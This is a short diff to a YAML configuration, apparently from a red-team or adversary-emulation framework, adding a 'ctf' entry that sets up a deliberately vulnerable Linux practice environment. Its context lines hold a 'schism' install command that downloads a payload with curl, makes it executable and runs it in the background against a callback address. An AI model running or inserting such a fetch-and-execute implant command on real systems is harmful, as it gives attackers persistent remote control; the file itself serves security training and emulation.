@@ -59,3 +59,11 @@ schism:
     schism.py:
       install: |
         curl PAYLOAD.URL > /tmp/schism && chmod +x /tmp/schism && pip install ftplib && nohup /tmp/schism -address #{callback} &
+
+ctf:
+  metadata:
+    description: Create a vulnerable environment to practice against
+    platforms: 
+      - linux
+  payloads:
+    vulnerable.sh: {}
